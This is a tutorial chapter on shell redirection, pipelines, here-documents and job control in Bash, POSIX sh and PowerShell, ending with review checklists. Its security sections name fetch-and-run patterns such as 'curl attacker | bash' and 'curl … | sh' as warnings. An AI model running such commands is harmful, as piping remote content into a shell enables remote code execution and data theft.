# Redirection, pipelines, and job control

[← Back to Shell](./README.md)

## What this chapter covers

How shells connect **standard streams** to files and other commands: file-descriptor redirection, pipelines, here-documents and here-strings, background jobs, and common signals. Bash (and POSIX `sh`) treat the pipeline as a **text** stream between processes. PowerShell’s pipeline is a deliberate contrast—**objects** flow between cmdlets. After this chapter you should redirect stderr safely, know pipeline exit-status pitfalls, and avoid confusing Unix job control with Windows process management.

---

## 1. Concepts

### 1. Three standard streams

Every process starts with three open file descriptors unless the parent changed them:

| FD | Name | Typical role |
|----|------|--------------|
| **0** | stdin | Input the program reads |
| **1** | stdout | Normal output |
| **2** | stderr | Diagnostics and errors |

Shell redirection rebinds those descriptors (and others) for one command or a whole pipeline. Understanding FD numbers matters more than memorizing every operator synonym.

### 2. Basic redirection operators (Bash / POSIX)

| Operator | Meaning |
|----------|---------|
| `> file` | Truncate/create `file` and send stdout there |
| `>> file` | Append stdout to `file` |
| `< file` | Read stdin from `file` |
| `2> file` | Send stderr to `file` |
| `2>> file` | Append stderr |
| `&> file` / `>& file` | Bash: redirect stdout **and** stderr (prefer explicit `>file 2>&1` for portability) |
| `n>&m` | Make FD `n` a copy of FD `m` |
| `n<&m` | Duplicate for input |
| `n>&-` / `n<&-` | Close FD `n` |

Order matters. `cmd >out 2>&1` sends both streams to `out`. `cmd 2>&1 >out` first points stderr at the old stdout, then redirects stdout—stderr may still go to the terminal.

```bash
# Capture both streams into one log (portable shape)
deploy.sh >deploy.log 2>&1

# Keep stdout for the next pipe; log errors separately
build.sh 2>build.err | tee build.out
```

### 3. Pipelines: connect stdout to stdin

The `|` operator connects the **stdout** of the left command to the **stdin** of the right. By default, **stderr** still goes to the terminal (or wherever FD 2 points).

```bash
grep -R pattern logs/ | sort | uniq -c | sort -nr
```

Pipeline components run concurrently as separate processes (implementation details vary). The shell’s reported exit status for a pipeline is historically the status of the **last** command unless `pipefail` (Bash) is set—covered in Advanced.

### 4. Here-documents and here-strings

A **here-document** feeds a multi-line body to stdin:

```bash
cat <<EOF
line one
line two
EOF
```

| Form | Behavior |
|------|----------|
| `<<EOF` | Expand parameters, command substitution, arithmetic inside the body |
| `<<'EOF'` / `<<"EOF"` | Literal body—no expansion (safer for secrets and code) |
| `<<-EOF` | Strip leading tabs (handy for indented scripts) |

Bash also has a **here-string**: `<<<"$var"` feeds the string as stdin (Bash extension; not POSIX).

### 5. Jobs and signals (interactive literacy)

| Concept | Meaning |
|---------|---------|
| **Foreground** | Shell waits for the process group |
| **Background** (`&`) | Shell continues; job is listed with `jobs` |
| **Suspend** | Typically `Ctrl-Z` sends `SIGTSTP` |
| **Continue** | `fg` / `bg` resume a stopped job |
| **Interrupt** | `Ctrl-C` → `SIGINT` |
| **Quit** | `Ctrl-\` → `SIGQUIT` (often with core dump on Unix) |

Scripts rarely use interactive job control; operators use it constantly. Production automation prefers explicit process supervisors over `Ctrl-Z` habits.

### 6. PowerShell contrast (preview)

In Bash/POSIX, `|` moves **bytes of text**. In PowerShell, `|` moves **.NET objects** between cmdlets—properties survive without reparsing columns. That is not “better redirection”; it is a different composition model. Chapter 12 deepens PowerShell; here the point is: do not assume Unix pipeline habits transfer unchanged to `pwsh`.

---

## 2. Advanced concepts

### 1. Merging and splitting streams deliberately

Common patterns:

```bash
# stdout to file, stderr to terminal
cmd >out.txt

# stderr only to file
cmd 2>err.txt

# both to same file (portable)
cmd >all.txt 2>&1

# stdout to next command; stderr to file
cmd 2>err.txt | processor
```

Duplicating FDs after open:

```bash
exec 3>trace.log          # open FD 3 for the rest of the script
echo "checkpoint" >&3
exec 3>&-                 # close
```

`exec` redirections apply to the current shell (or script), not only one child—powerful and easy to leave dangling.

### 2. `pipefail`, `PIPESTATUS`, and silent middle failures

Without `set -o pipefail`, Bash reports only the last pipeline stage’s status. A failing `grep` in the middle can be masked by a successful `sort` at the end.

```bash
set -o pipefail    # Bash; not portable to all POSIX sh
false | true
echo $?            # 1 with pipefail; 0 without

# Inspect each stage (Bash)
true | false | true
echo "${PIPESTATUS[@]}"   # 0 1 0
```

| Feature | Bash 5.x / 4.x | Bash 3.2 | dash / BusyBox `sh` | PowerShell | cmd |
|---------|----------------|----------|---------------------|------------|-----|
| `|` text pipeline | Yes | Yes | Yes | Objects (different) | Limited |
| `set -o pipefail` | Yes | Yes | No (not required by POSIX historically; dash lacks it) | N/A (different model) | N/A |
| `PIPESTATUS` | Yes | Yes | No | N/A | N/A |
| `|&` (stdout+stderr to pipe) | **Bash 4.0+** | **Missing** | No | Different (`*` streams) | N/A |

Prefer `set -euo pipefail` literacy in Bash CI scripts (details in chapter 16). Under `#!/bin/sh` on dash, do not rely on `pipefail`.

### 3. Process substitution vs pipes (Bash)

Process substitution (`<(…)` / `>(…)`) feeds a command’s output as a filename (often under `/dev/fd`). It is a **Bash** (and some ksh/zsh) feature—not POSIX, not dash. It **does** exist on stock macOS **Bash 3.2**; do not confuse it with Bash 4-only features.

```bash
# Compare two command outputs without temp files (Bash)
diff <(sort a.txt) <(sort b.txt)
```

| Construct | Bash 3.2 | Bash 4+/5.x | POSIX `sh` | Notes |
|-----------|----------|-------------|------------|-------|
| `<(cmd)` / `>(cmd)` | Yes | Yes | **No** | Needs `/dev/fd` (or equivalent) |
| `|&` | **No** | **Yes (4.0+)** | No | Synonym for `2>&1 \|` |
| `<<<` here-string | Yes | Yes | **No** | |

### 4. Background jobs, `wait`, and signals in scripts

```bash
long_task &
pid=$!
wait "$pid" || echo "task failed: $?"
```

| Signal | Typical cause | Script habit |
|--------|---------------|--------------|
| `SIGINT` | Ctrl-C / cancel | Trap for cleanup |
| `SIGTERM` | `kill`, orchestrators | Default graceful stop |
| `SIGHUP` | Terminal hangup | `nohup` or systemd/supervisor |
| `SIGPIPE` | Writer when reader closes | Common in pipelines; often ignored by default policy |

Job control (`set -m`, `fg`, `bg`) is primarily interactive. In non-interactive CI, prefer foreground pipelines or an explicit supervisor (systemd, Kubernetes, Windows Service)—not shell job tables.

### 5. Cross-OS availability matrix

| Capability | Linux Bash | macOS Bash 3.2 / zsh | PowerShell 7 | cmd.exe | WSL |
|------------|------------|----------------------|--------------|---------|-----|
| FD redirect `>`, `2>`, `2>&1` | Yes | Yes | Different (`>`, `2>`, `*>`) | Limited (`>`, `2>`) | Yes (Linux side) |
| Text `|` pipeline | Yes | Yes | Object `|` | `|` pipes text between console apps | Yes |
| Here-doc `<<` | Yes | Yes | Here-strings `@'...'@` / `@"..."@` | Limited tricks | Yes |
| Job control builtins | Yes | Yes | Jobs exist; model differs | `start` | Yes |
| `kill` / signals | POSIX signals | BSD userland + shell | `Stop-Process`; not Unix signals on Win | `taskkill` | Linux signals inside WSL |

Windows-native automation reaches for PowerShell (chapter 12) or cmd (chapter 13). Unix redirections inside Git Bash/MSYS are Bash-like but still sit beside Windows path and encoding rules.

### 6. Security edges of redirection

- Redirecting secrets to world-readable files (`umask`, directory permissions).
- `curl … | sh` — remote code execution by design; prefer verified artifacts.
- Clobbering important files with `>` when `set -o noclobber` (`set -C`) would have saved you.
- Logging credentials on stderr that get merged into shared CI logs via `2>&1`.

### 7. Here-documents in automation

Here-docs generate configs, unit files, and SQL without juggling dozens of `echo` lines. Prefer quoted delimiters when the body must stay literal:

```bash
cat >"$tmpdir/app.env" <<'EOF'
# generated — do not edit by hand
APP_MODE=production
EOF
```

Unquoted delimiters expand `$HOME`, `$(date)`, and friends—useful for stamped headers, dangerous for secrets or shell metacharacters in templates. `<<-EOF` tab-stripping helps keep indented script bodies readable; spaces (not tabs) will not strip.

### 8. Closing FDs and “too many open files”

Long-running scripts that `exec N>file` in loops without closing FDs eventually hit `ulimit -n`. Pattern: open, write, `exec N>&-` in the same scope. Prefer opening once outside a hot loop when appending a single log.

### 9. Pipeline buffering and interactivity

Stdout to a terminal is often line-buffered; stdout to a pipe may be fully buffered. Tools appear “stuck” until buffers flush. Mitigations vary by tool (`stdbuf` on GNU, tool-specific `--line-buffered`, or avoiding unnecessary pipes for interactive progress). Staff debugging “hung” CI stages should ask whether the stage is waiting on a full buffer rather than a deadlock.

### 10. Job control vs orchestrators

`command &` / `wait` is fine for a handful of sibling tasks in a script. It is the wrong abstraction for fleet workloads—use systemd units, Kubernetes Jobs, Windows services, or a workflow engine. Mixing shell background jobs with container PID 1 responsibilities is a common source of unreaped children and ignored `SIGTERM`.

---

## 3. Applications and use cases

### Application and build tooling

Compilers and test runners emit diagnostics on stderr and machine-readable results on stdout. Preserve that split when wrapping tools in scripts: pipe stdout to reporters; tee or archive stderr for humans.

### Operations and runbooks

Capture both streams for incident timelines:

```bash
ansible-playbook site.yml >run.out 2>run.err
```

Or a single chronologically merged log with `>run.log 2>&1` when ordering matters more than stream identity.

### CI systems

Name failure modes: missing `pipefail` hides broken stages; dumping secrets into logs via merged streams fails audits. Pin Bash where `pipefail` and `PIPESTATUS` are required.

### Security / cybersecurity

Redirection is how exfiltration and log poisoning happen in compromised scripts (`curl attacker | bash`, writing API keys to `/tmp`). Review every `2>&1` merge for secret leakage. Prefer quoted here-docs (`<<'EOF'`) when embedding policies or keys material that must not expand.

### Software engineering

Treat pipeline shape as API: document whether a script’s contract is “stdout is JSON” vs “stdout is human text.” Consumers should not scrape banners from stdout if you can keep them on stderr.

Smoke-test helpers often want quiet success and loud failure:

```bash
set -euo pipefail
smoke() {
  curl -fsS "$1" >/dev/null
}
smoke "$HEALTH_URL" 2>smoke.err || {
  printf '%s\n' "health check failed" >&2
  cat smoke.err >&2
  exit 1
}
```

### Systems programming edges

Daemons and long-lived agents inherit FDs from parents. Close or redirect inherited descriptors deliberately in entrypoints. Container `ENTRYPOINT` scripts that background a process and exit will stop the container unless PID 1 is a real supervisor.

### Data and analytics glue

Log shippers and ETL bootstraps frequently `tail -F` into pipes. Document encoding (UTF-8 vs locale) and whether stderr from parsers is telemetry or noise. Object-oriented PowerShell pipelines (chapter 12) may fit structured records better than repeated `awk` on Windows estates.

### Whole-engineering OS context

Kernel and OS admin depth for shells lives beside this track—for Linux process/IO context see [`../../Operating-Systems/Linux/9_Shell_And_Scripting.md`](../../Operating-Systems/Linux/9_Shell_And_Scripting.md); for Windows command surfaces see [`../../Operating-Systems/Windows/1_Windows_Commands_And_PowerShell.md`](../../Operating-Systems/Windows/1_Windows_Commands_And_PowerShell.md). This chapter stays on dialect semantics.

### Staff-level review checklist

- Are stdout and stderr roles documented for each public script?
- Is `2>&1` order correct wherever both streams are captured?
- Is `pipefail` (Bash) set when middle-stage failure must fail the job?
- Are here-docs quoted (`<<'EOF'`) when expansion would be harmful?
- Are Bash-only forms (`<<<`, `|&`, `&>`) absent from `#!/bin/sh` scripts?
- Do background jobs always `wait` (or get supervised) so failures are not lost?
- Are secrets excluded from merged CI logs?
- Is PowerShell automation using object pipelines on purpose—not forcing everything through text parse?

---

## References

- [GNU Bash manual — Redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)
- [GNU Bash manual — Pipelines](https://www.gnu.org/software/bash/manual/html_node/Pipelines.html)
- [GNU Bash manual — Job Control](https://www.gnu.org/software/bash/manual/html_node/Job-Control.html)
- [POSIX Shell Command Language](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html)
- [about_Redirection (PowerShell)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_redirection)
- [about_Pipelines (PowerShell)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pipelines)
- [Windows commands](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
